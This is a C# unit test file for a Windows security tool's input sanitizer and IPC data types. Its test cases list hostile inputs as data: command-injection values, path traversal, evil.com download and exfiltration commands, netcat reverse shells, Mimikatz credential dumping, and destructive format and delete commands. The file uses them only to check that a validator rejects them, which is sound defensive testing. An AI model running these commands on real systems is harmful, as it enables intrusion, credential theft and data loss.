using WinSentinel.Core.Helpers;
using WinSentinel.Core.Services;

namespace WinSentinel.Tests;

/// <summary>
/// Tests for InputSanitizer — security-critical input validation and sanitization.
/// Covers all 5 public methods: SanitizeIpAddress, SanitizeUsername,
/// SanitizeDriveLetter, SanitizeFirewallRuleName, and CheckDangerousCommand.
/// </summary>
public class InputSanitizerTests
{
    // ── SanitizeIpAddress ─────────────────────────────────────────────

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void SanitizeIpAddress_NullOrEmpty_ReturnsNull(string? input)
    {
        Assert.Null(InputSanitizer.SanitizeIpAddress(input));
    }

    [Theory]
    [InlineData("192.168.1.1", "192.168.1.1")]
    [InlineData("10.0.0.1", "10.0.0.1")]
    [InlineData("255.255.255.255", "255.255.255.255")]
    [InlineData("0.0.0.0", "0.0.0.0")]
    [InlineData("127.0.0.1", "127.0.0.1")]
    public void SanitizeIpAddress_ValidIPv4_ReturnsCanonical(string input, string expected)
    {
        Assert.Equal(expected, InputSanitizer.SanitizeIpAddress(input));
    }

    [Theory]
    [InlineData("::1", "::1")]
    [InlineData("fe80::1", "fe80::1")]
    public void SanitizeIpAddress_ValidIPv6_ReturnsCanonical(string input, string expected)
    {
        Assert.Equal(expected, InputSanitizer.SanitizeIpAddress(input));
    }

    [Theory]
    [InlineData("  192.168.1.1  ", "192.168.1.1")]
    public void SanitizeIpAddress_WithWhitespace_Trimmed(string input, string expected)
    {
        Assert.Equal(expected, InputSanitizer.SanitizeIpAddress(input));
    }

    [Theory]
    [InlineData("not-an-ip")]
    [InlineData("999.999.999.999")]
    [InlineData("192.168.1.1;whoami")]
    [InlineData("192.168.1.1 & echo pwned")]
    [InlineData("$(whoami)")]
    [InlineData("192.168.1.1|net user")]
    public void SanitizeIpAddress_InvalidOrInjection_ReturnsNull(string input)
    {
        Assert.Null(InputSanitizer.SanitizeIpAddress(input));
    }

    // ── SanitizeUsername ──────────────────────────────────────────────

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void SanitizeUsername_NullOrEmpty_ReturnsNull(string? input)
    {
        Assert.Null(InputSanitizer.SanitizeUsername(input));
    }

    [Theory]
    [InlineData("Administrator", "Administrator")]
    [InlineData("john.doe", "john.doe")]
    [InlineData("DOMAIN\\user", "DOMAIN\\user")]
    [InlineData("user_name", "user_name")]
    [InlineData("user-name", "user-name")]
    [InlineData("user@domain.com", "user@domain.com")]
    public void SanitizeUsername_ValidUsernames_ReturnsTrimmed(string input, string expected)
    {
        Assert.Equal(expected, InputSanitizer.SanitizeUsername(input));
    }

    [Theory]
    [InlineData("  admin  ", "admin")]
    public void SanitizeUsername_WithWhitespace_Trimmed(string input, string expected)
    {
        Assert.Equal(expected, InputSanitizer.SanitizeUsername(input));
    }

    [Theory]
    [InlineData("admin;whoami")]
    [InlineData("admin|net user")]
    [InlineData("admin&echo pwned")]
    [InlineData("admin$(whoami)")]
    [InlineData("admin`ls`")]
    public void SanitizeUsername_Injection_ReturnsNull(string input)
    {
        Assert.Null(InputSanitizer.SanitizeUsername(input));
    }

    [Fact]
    public void SanitizeUsername_TooLong_ReturnsNull()
    {
        var longName = new string('a', 257);
        Assert.Null(InputSanitizer.SanitizeUsername(longName));
    }

    [Fact]
    public void SanitizeUsername_ExactMaxLength_ReturnsValue()
    {
        var name = new string('a', 256);
        Assert.Equal(name, InputSanitizer.SanitizeUsername(name));
    }

    // ── SanitizeDriveLetter ──────────────────────────────────────────

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void SanitizeDriveLetter_NullOrEmpty_ReturnsNull(string? input)
    {
        Assert.Null(InputSanitizer.SanitizeDriveLetter(input));
    }

    [Theory]
    [InlineData("C:", "C:")]
    [InlineData("D:", "D:")]
    [InlineData("c:", "C:")]
    [InlineData("d:", "D:")]
    [InlineData("C", "C")]
    [InlineData("c", "C")]
    public void SanitizeDriveLetter_Valid_ReturnsUppercase(string input, string expected)
    {
        Assert.Equal(expected, InputSanitizer.SanitizeDriveLetter(input));
    }

    [Theory]
    [InlineData("CC:")]
    [InlineData("1:")]
    [InlineData("C:\\")]
    [InlineData("C:\\Windows")]
    [InlineData(";")]
    [InlineData("C; whoami")]
    public void SanitizeDriveLetter_Invalid_ReturnsNull(string input)
    {
        Assert.Null(InputSanitizer.SanitizeDriveLetter(input));
    }

    // ── SanitizeFirewallRuleName ──────────────────────────────────────

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void SanitizeFirewallRuleName_NullOrEmpty_ReturnsNull(string? input)
    {
        Assert.Null(InputSanitizer.SanitizeFirewallRuleName(input));
    }

    [Theory]
    [InlineData("Block Inbound Port 80", "Block Inbound Port 80")]
    [InlineData("Allow_HTTPS", "Allow_HTTPS")]
    [InlineData("Rule-Name.v2", "Rule-Name.v2")]
    [InlineData("My Custom Rule", "My Custom Rule")]
    public void SanitizeFirewallRuleName_Valid_ReturnsValue(string input, string expected)
    {
        Assert.Equal(expected, InputSanitizer.SanitizeFirewallRuleName(input));
    }

    [Theory]
    [InlineData("rule;whoami")]
    [InlineData("rule|echo pwned")]
    [InlineData("rule&calc.exe")]
    [InlineData("rule$(id)")]
    [InlineData("rule`ls`")]
    public void SanitizeFirewallRuleName_Injection_ReturnsNull(string input)
    {
        Assert.Null(InputSanitizer.SanitizeFirewallRuleName(input));
    }

    [Fact]
    public void SanitizeFirewallRuleName_TooLong_ReturnsNull()
    {
        var longName = new string('a', 257);
        Assert.Null(InputSanitizer.SanitizeFirewallRuleName(longName));
    }

    [Fact]
    public void SanitizeFirewallRuleName_ExactMaxLength_ReturnsValue()
    {
        var name = new string('a', 256);
        Assert.Equal(name, InputSanitizer.SanitizeFirewallRuleName(name));
    }

    [Theory]
    [InlineData("  My Rule  ", "My Rule")]
    public void SanitizeFirewallRuleName_Trimmed(string input, string expected)
    {
        Assert.Equal(expected, InputSanitizer.SanitizeFirewallRuleName(input));
    }

    // ── CheckDangerousCommand ─────────────────────────────────────────

    [Theory]
    [InlineData(null, "Empty command")]
    [InlineData("", "Empty command")]
    [InlineData("   ", "Empty command")]
    public void CheckDangerousCommand_NullOrEmpty_ReturnsReason(string? input, string expected)
    {
        Assert.Equal(expected, InputSanitizer.CheckDangerousCommand(input));
    }

    [Theory]
    [InlineData("netsh advfirewall set allprofiles state on")]
    [InlineData("Set-MpPreference -DisableRealtimeMonitoring $false")]
    [InlineData("reg add HKLM\\SOFTWARE\\Key /v Name /t REG_DWORD /d 1 /f")]
    [InlineData("sfc /scannow")]
    public void CheckDangerousCommand_SafeCommands_ReturnsNull(string input)
    {
        Assert.Null(InputSanitizer.CheckDangerousCommand(input));
    }

    [Theory]
    [InlineData("format C: /y", "destructive format")]
    [InlineData("del /s /q C:\\*", "recursive delete")]
    public void CheckDangerousCommand_DestructiveCommands_ReturnsReason(string input, string reasonContains)
    {
        var result = InputSanitizer.CheckDangerousCommand(input);
        Assert.NotNull(result);
        Assert.Contains(reasonContains, result, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("Invoke-WebRequest http://evil.com/payload")]
    [InlineData("curl http://evil.com/exfil")]
    [InlineData("wget http://evil.com/malware")]
    [InlineData("iwr http://evil.com")]
    public void CheckDangerousCommand_NetworkExfiltration_ReturnsReason(string input)
    {
        var result = InputSanitizer.CheckDangerousCommand(input);
        Assert.NotNull(result);
        Assert.Contains("network", result, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("mimikatz.exe")]
    [InlineData("Get-Credential")]
    [InlineData("cmdkey /add:server")]
    [InlineData("sekurlsa::logonpasswords")]
    public void CheckDangerousCommand_CredentialAccess_ReturnsReason(string input)
    {
        var result = InputSanitizer.CheckDangerousCommand(input);
        Assert.NotNull(result);
        Assert.Contains("credential", result, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("ncat -e cmd 10.0.0.1 4444")]
    [InlineData("nc.exe -e cmd.exe 10.0.0.1 4444")]
    public void CheckDangerousCommand_ReverseShells_ReturnsReason(string input)
    {
        var result = InputSanitizer.CheckDangerousCommand(input);
        Assert.NotNull(result);
        Assert.Contains("reverse shell", result, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("powershell -encodedcommand ZQBjAGgAbwA=")]
    public void CheckDangerousCommand_EncodedCommands_ReturnsReason(string input)
    {
        var result = InputSanitizer.CheckDangerousCommand(input);
        Assert.NotNull(result);
        Assert.Contains("encoded", result, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void CheckDangerousCommand_CaseInsensitive()
    {
        // All checks should be case-insensitive
        Assert.NotNull(InputSanitizer.CheckDangerousCommand("MIMIKATZ.EXE"));
        Assert.NotNull(InputSanitizer.CheckDangerousCommand("FORMAT C: /Y"));
        Assert.NotNull(InputSanitizer.CheckDangerousCommand("INVOKE-WEBREQUEST http://evil.com"));
    }

    // ── ValidateFilePath ─────────────────────────────────────────────

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void ValidateFilePath_NullOrEmpty_ReturnsNull(string? input)
    {
        Assert.Null(InputSanitizer.ValidateFilePath(input));
    }

    [Fact]
    public void ValidateFilePath_PathTraversal_ReturnsNull()
    {
        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Users\..\Windows\System32\cmd.exe"));
        Assert.Null(InputSanitizer.ValidateFilePath(@"..\..\Windows\System32\cmd.exe"));
        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\..\..\Windows\notepad.exe"));
    }

    [Fact]
    public void ValidateFilePath_UncPath_ReturnsNull()
    {
        Assert.Null(InputSanitizer.ValidateFilePath(@"\\server\share\file.exe"));
        Assert.Null(InputSanitizer.ValidateFilePath(@"//server/share/file.exe"));
    }

    [Fact]
    public void ValidateFilePath_NullByte_ReturnsNull()
    {
        Assert.Null(InputSanitizer.ValidateFilePath("C:\\Temp\\file.exe\0.txt"));
    }

    [Fact]
    public void ValidateFilePath_AlternateDataStream_ReturnsNull()
    {
        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\file.txt:hidden"));
        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\file.txt:$DATA"));
    }

    [Fact]
    public void ValidateFilePath_ShellMetachars_ReturnsNull()
    {
        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\file.exe|whoami"));
        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\file.exe&calc"));
        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\file.exe;dir"));
        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\$(whoami)"));
        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\`calc`"));
    }

    [Fact]
    public void ValidateFilePath_ProtectedWindowsDir_ReturnsNull()
    {
        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Windows\System32\cmd.exe"));
        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Windows\notepad.exe"));
        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\WINDOWS\explorer.exe"));
    }

    [Fact]
    public void ValidateFilePath_ProtectedProgramFiles_ReturnsNull()
    {
        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Program Files\app\app.exe"));
        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Program Files (x86)\app\app.exe"));
    }

    [Fact]
    public void ValidateFilePath_ProtectedFileName_ReturnsNull()
    {
        // Critical system executables should be rejected regardless of path
        Assert.Null(InputSanitizer.ValidateFilePath(@"D:\Temp\svchost.exe"));
        Assert.Null(InputSanitizer.ValidateFilePath(@"D:\Temp\lsass.exe"));
        Assert.Null(InputSanitizer.ValidateFilePath(@"D:\Temp\ntoskrnl.exe"));
        Assert.Null(InputSanitizer.ValidateFilePath(@"D:\Temp\kernel32.dll"));
    }

    [Fact]
    public void ValidateFilePath_TooLong_ReturnsNull()
    {
        var longPath = @"C:\Temp\" + new string('a', 260) + ".exe";
        Assert.Null(InputSanitizer.ValidateFilePath(longPath));
    }

    [Fact]
    public void ValidateFilePath_ValidPaths_ReturnsCanonicalized()
    {
        // These should be accepted (not protected, no traversal)
        var result = InputSanitizer.ValidateFilePath(@"D:\Temp\suspicious.exe");
        Assert.NotNull(result);
        Assert.Equal(@"D:\Temp\suspicious.exe", result);
    }

    [Fact]
    public void ValidateFilePath_UserProfile_Accepted()
    {
        var path = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
            "Downloads", "test.exe");
        var result = InputSanitizer.ValidateFilePath(path);
        Assert.NotNull(result);
    }

    // ── SanitizeProcessInput ──────────────────────────────────────────

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void SanitizeProcessInput_NullOrEmpty_ReturnsNull(string? input)
    {
        Assert.Null(InputSanitizer.SanitizeProcessInput(input));
    }

    [Theory]
    [InlineData("notepad.exe", "notepad.exe")]
    [InlineData("chrome.exe", "chrome.exe")]
    [InlineData("my-app.exe", "my-app.exe")]
    [InlineData("app_v2.0", "app_v2.0")]
    public void SanitizeProcessInput_ValidNames_ReturnsValue(string input, string expected)
    {
        Assert.Equal(expected, InputSanitizer.SanitizeProcessInput(input));
    }

    [Theory]
    [InlineData("1234", "1234")]
    [InlineData("8080", "8080")]
    public void SanitizeProcessInput_ValidPid_ReturnsValue(string input, string expected)
    {
        Assert.Equal(expected, InputSanitizer.SanitizeProcessInput(input));
    }

    [Theory]
    [InlineData("0")]
    [InlineData("1")]
    [InlineData("4")]
    public void SanitizeProcessInput_SystemPid_ReturnsNull(string input)
    {
        // PID 0 (System Idle) and PID 4 (System) must never be killed
        Assert.Null(InputSanitizer.SanitizeProcessInput(input));
    }

    [Theory]
    [InlineData("notepad;whoami")]
    [InlineData("app|calc")]
    [InlineData("app&dir")]
    [InlineData("app$(id)")]
    [InlineData("app`ls`")]
    [InlineData("app name with spaces")]
    public void SanitizeProcessInput_Injection_ReturnsNull(string input)
    {
        Assert.Null(InputSanitizer.SanitizeProcessInput(input));
    }

    [Fact]
    public void SanitizeProcessInput_TooLong_ReturnsNull()
    {
        var longName = new string('a', 257);
        Assert.Null(InputSanitizer.SanitizeProcessInput(longName));
    }

    // ── SanitizeForLog ────────────────────────────────────────────────

    [Theory]
    [InlineData(null, "")]
    [InlineData("", "")]
    public void SanitizeForLog_NullOrEmpty_ReturnsEmpty(string? input, string expected)
    {
        Assert.Equal(expected, InputSanitizer.SanitizeForLog(input));
    }

    [Fact]
    public void SanitizeForLog_NormalText_Unchanged()
    {
        var text = "This is normal log text with numbers 123 and symbols !@#";
        Assert.Equal(text, InputSanitizer.SanitizeForLog(text));
    }

    [Fact]
    public void SanitizeForLog_CrlfInjection_Escaped()
    {
        var input = "Normal text\r\nInjected log line";
        var result = InputSanitizer.SanitizeForLog(input);
        Assert.Contains("[CRLF]", result);
        Assert.DoesNotContain("\r\n", result);
    }

    [Fact]
    public void SanitizeForLog_NewlineOnly_Escaped()
    {
        var input = "Line1\nLine2";
        var result = InputSanitizer.SanitizeForLog(input);
        Assert.Contains("[LF]", result);
        Assert.DoesNotContain("\n", result);
    }

    [Fact]
    public void SanitizeForLog_CarriageReturnOnly_Escaped()
    {
        var input = "Line1\rLine2";
        var result = InputSanitizer.SanitizeForLog(input);
        Assert.Contains("[CR]", result);
    }

    [Fact]
    public void SanitizeForLog_ControlChars_Escaped()
    {
        // Use \u escapes (4 digits, unambiguous) instead of \x (variable-length, greedy)
        var input = "Text\u0001\u0002\u0003End";
        var result = InputSanitizer.SanitizeForLog(input);
        Assert.Contains("[0x01]", result);
        Assert.Contains("[0x02]", result);
        Assert.Contains("[0x03]", result);
    }

    [Fact]
    public void SanitizeForLog_NullByte_Escaped()
    {
        var input = "Text\u0000End";
        var result = InputSanitizer.SanitizeForLog(input);
        Assert.Contains("[0x00]", result);
    }
}

/// <summary>
/// Tests for IPC DTOs — IpcResponse.GetPayload and IpcAgentStatus.UptimeFormatted.
/// </summary>
public class IpcDtoTests
{
    [Fact]
    public void IpcAgentStatus_UptimeFormatted_Seconds()
    {
        var status = new IpcAgentStatus { UptimeSeconds = 45 };
        Assert.Equal("0m 45s", status.UptimeFormatted);
    }

    [Fact]
    public void IpcAgentStatus_UptimeFormatted_Minutes()
    {
        var status = new IpcAgentStatus { UptimeSeconds = 600 };
        Assert.Equal("10m 0s", status.UptimeFormatted);
    }

    [Fact]
    public void IpcAgentStatus_UptimeFormatted_Hours()
    {
        var status = new IpcAgentStatus { UptimeSeconds = 7200 };
        Assert.Equal("2h 0m", status.UptimeFormatted);
    }

    [Fact]
    public void IpcAgentStatus_UptimeFormatted_Days()
    {
        var status = new IpcAgentStatus { UptimeSeconds = 90061 };
        Assert.Equal("1d 1h 1m", status.UptimeFormatted);
    }

    [Fact]
    public void IpcAgentStatus_UptimeFormatted_Zero()
    {
        var status = new IpcAgentStatus { UptimeSeconds = 0 };
        Assert.Equal("0m 0s", status.UptimeFormatted);
    }

    [Fact]
    public void IpcAgentStatus_UptimeFormatted_LargeDays()
    {
        var status = new IpcAgentStatus { UptimeSeconds = 259200 }; // 3 days exactly
        Assert.Equal("3d 0h 0m", status.UptimeFormatted);
    }

    [Fact]
    public void IpcResponse_GetPayload_NullPayload_ReturnsDefault()
    {
        var response = new IpcResponse
        {
            Type = "Pong",
            Payload = null
        };
        var payload = response.GetPayload<IpcAgentStatus>();
        Assert.Null(payload);
    }

    [Fact]
    public void IpcResponse_GetPayload_ComplexPayload()
    {
        var config = new IpcAgentConfig
        {
            ScanIntervalHours = 4.0,
            AutoFixCritical = true,
            RiskTolerance = "Low"
        };
        var json = System.Text.Json.JsonSerializer.SerializeToElement(config,
            new System.Text.Json.JsonSerializerOptions
            {
                PropertyNamingPolicy = System.Text.Json.JsonNamingPolicy.CamelCase
            });
        var response = new IpcResponse
        {
            Type = "ConfigResponse",
            Payload = json
        };
        var result = response.GetPayload<IpcAgentConfig>();
        Assert.NotNull(result);
        Assert.Equal(4.0, result!.ScanIntervalHours);
        Assert.True(result.AutoFixCritical);
        Assert.Equal("Low", result.RiskTolerance);
    }

    [Fact]
    public void IpcChatResponse_DefaultValues()
    {
        var response = new IpcChatResponse();
        Assert.Equal("", response.Text);
        Assert.Empty(response.SuggestedActions);
        Assert.Empty(response.ThreatEvents);
        Assert.Null(response.SecurityScore);
        Assert.False(response.ActionPerformed);
        Assert.Null(response.ActionId);
        Assert.Equal("General", response.Category);
    }

    [Fact]
    public void IpcThreatEvent_Properties()
    {
        var now = DateTimeOffset.UtcNow;
        var threat = new IpcThreatEvent
        {
            Id = "t1",
            Timestamp = now,
            Source = "NetworkMonitor",
            Severity = "Critical",
            Title = "Suspicious outbound connection",
            Description = "Connection to known C2 server",
            AutoFixable = true,
            ResponseTaken = "Blocked",
            FixCommand = "netsh advfirewall firewall add rule ..."
        };

        Assert.Equal("t1", threat.Id);
        Assert.Equal(now, threat.Timestamp);
        Assert.Equal("NetworkMonitor", threat.Source);
        Assert.Equal("Critical", threat.Severity);
        Assert.True(threat.AutoFixable);
        Assert.Equal("Blocked", threat.ResponseTaken);
    }

    [Fact]
    public void IpcFixResult_DefaultValues()
    {
        var result = new IpcFixResult();
        Assert.False(result.Success);
        Assert.Null(result.Command);
        Assert.Null(result.Output);
        Assert.Null(result.Error);
        Assert.Null(result.ExitCode);
        Assert.Null(result.FindingTitle);
    }

    [Fact]
    public void IpcAgentConfig_DefaultValues()
    {
        var config = new IpcAgentConfig();
        Assert.Equal("Medium", config.RiskTolerance);
        Assert.True(config.MinimizeToTray);
        Assert.True(config.NotificationSound);
        Assert.Equal("HTML", config.AutoExportFormat);
        Assert.False(config.AutoFixCritical);
        Assert.False(config.AutoFixWarnings);
    }

    [Fact]
    public void IpcPolicyData_DefaultValues()
    {
        var policy = new IpcPolicyData();
        Assert.Empty(policy.Rules);
        Assert.Empty(policy.UserOverrides);
        Assert.Equal("Medium", policy.RiskTolerance);
    }

    [Fact]
    public void IpcRequest_Properties()
    {
        var request = new IpcRequest
        {
            Type = "GetStatus",
            RequestId = "abc123"
        };
        Assert.Equal("GetStatus", request.Type);
        Assert.Equal("abc123", request.RequestId);
        Assert.Null(request.Payload);
    }

    [Fact]
    public void IpcScanProgress_Properties()
    {
        var progress = new IpcScanProgress
        {
            Module = "Firewall",
            Current = 3,
            Total = 13
        };
        Assert.Equal("Firewall", progress.Module);
        Assert.Equal(3, progress.Current);
        Assert.Equal(13, progress.Total);
    }
}
